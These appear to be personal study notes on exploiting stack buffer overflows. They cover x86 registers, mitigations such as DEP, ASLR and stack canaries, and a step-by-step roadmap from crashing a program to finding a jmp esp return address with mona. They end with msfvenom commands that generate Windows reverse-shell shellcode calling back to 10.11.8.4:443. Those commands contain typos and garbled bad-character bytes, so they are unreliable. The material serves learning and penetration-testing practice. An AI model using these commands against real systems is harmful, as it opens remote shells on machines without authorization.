* Each function has an associated stack frame allocated at run time.

* Stack grows from high to low memory address.

* Heap grows from low to high memory address.

* Most of the computers use little endian format(\x04\x03\x02\x01) to write words(16 bits) on stack.

* Buffer allocated on stack is filled from low to high memory address which makes it possible to overwrite ebp,eip and other registers if buffer length is not handled properly.

* Register length

```
EAX	- Extended Accumulator	- 32 bits
AX	- Accumulator			- 16 bits
AL 	- Accumulator low		- 8 bits
```

* General Purpose Registers

```
EAX (accumulator): Arithmetical and logical instructions
EBX (base): Base pointer for memory addresses
ECX (counter): Loop, shift, and rotation counter
EDX (data): I/O port addressing, multiplication, and division
ESI (source index): Pointer addressing source in string copy operations
EDI (destination index): Pointer addressing destination in string copy operations
```

* Other Important Registers

```
ESP- The Stack Pointer (top of stack)
EBP - The Base Pointer (bottom of stack)
EIP- The Instruction Pointer
```

## Buffer overflow Protections in place


* __Data Execution Prevention__ - DEP forces certain structures, including the stack, to be marked as non-executable. This prevents shellcode written on stack to execute.

* __Address Space Layout Randomization__ - ASLR randomizes the base addresses of loaded applications and DLLs every time the operating
system is booted. This makes it difficult to code return address during exploitation if the application is compiled with ASLR.

* __Control Flow Guard__(windows) - CFG, Microsoft's implementation of control-flow integrity, performs validation of indirect code branching, preventing overwrites of function pointers.

* __Stack canaries__(linux) - Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately. 


## Roadmap to exploitation (stack based only)

* Try to crash the program with incrementing buffer length.

* Overwrite the EIP register.

* Identify the offset

```
msf-pattern_create -l 888
msf-pattern_offset -l 888 -q <EIP-hex-value>
```

* Locate Space for Shellcode

	a. If shellcode cannot be written on stack, try to find other places or references where user inputs are stored

	b. If their is little space left on stack, try to write first stage payload(eg. jmp esi) which redirects the execution to second stage shellcode.


* Check for Bad Characters - send all characters from \x00 to \xff as buffer value to see which characters are not allowed.

* Make sure return address used in exploit do not contain bad character.

* Do not hard code return address. Try to find an instruction in static library which serves the purpose. Eg- jmp esp (If shellcode is pointed by esp)

* To identify suitable return address for exploit, see all libraries with ASLR protection disabled and address range containing no bad characters. `!mona modules`

* use msf-nasm_shell to get hex value of required instruction and use plugins like mona script to find occurences of required instruction in the static library.

```
!mona find -s "\xff\xe4" -m "libspp.dll"
```

* Generate shellcode with metasploit

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.8.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x88\x8a\x0d\x2S\x26\x2b\x3d"

// For multi-threaded applications, it is better to exit thread instead of process to avoid crash

msfvenom -p windows/ shett_reverse_tcp LHOST=10.11.8.4 LPORT=443 EXITFUNC=
thread -f c -e x86/shikata_ga_nai -b "\x88\x8a\x8d\x25\x26\x2b\x3d"
```

